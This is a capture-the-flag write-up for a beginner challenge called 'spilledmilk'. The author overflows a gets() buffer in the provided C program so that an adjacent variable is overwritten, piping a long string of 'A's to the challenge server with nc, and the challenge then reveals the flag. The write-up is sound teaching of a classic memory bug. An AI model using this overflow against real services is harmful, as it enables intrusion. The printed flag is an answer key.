# spilledmilk (ðŸª™ 908)

We have made a program to train new milkmen in the town, but sometimes weird things happen with it, can you figure out what is wrong?

The source code is in the .txt-file.

nc 51.20.45.230 4004

ðŸ“Ž [script.txt](script.c)

# Writeup

Script seems like a pretty basic C, renamed it to `script.c` and used `gcc script.c -o script && chmod +x script` to compile it and make it executable. Now I can test locally.

I see that it uses `gets` to read the input from me. According to the [manual](https://man7.org/linux/man-pages/man3/gets.3.html) it states `Never use this function`. That is explained a lot better on youtube, but I remember that it is due to overflow. I can write more to memory and overwrite other data.

The code shows it will print flag if `secret_variable` is anything but 0. And since `buffer` which we read into is allocated right before the secret variable in memory we can just overflow until we overwrite that variable.

```bash
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc 51.20.45.230 4004
Good day!
Could you be so kind and pour me a glass of milk, please?

Watch it! You are spilling the milk!
siktCTF{Spi113d_M1lk}

Thank you, that was delicious!
```

# Flag

```
 siktCTF{Spi113d_M1lk}
```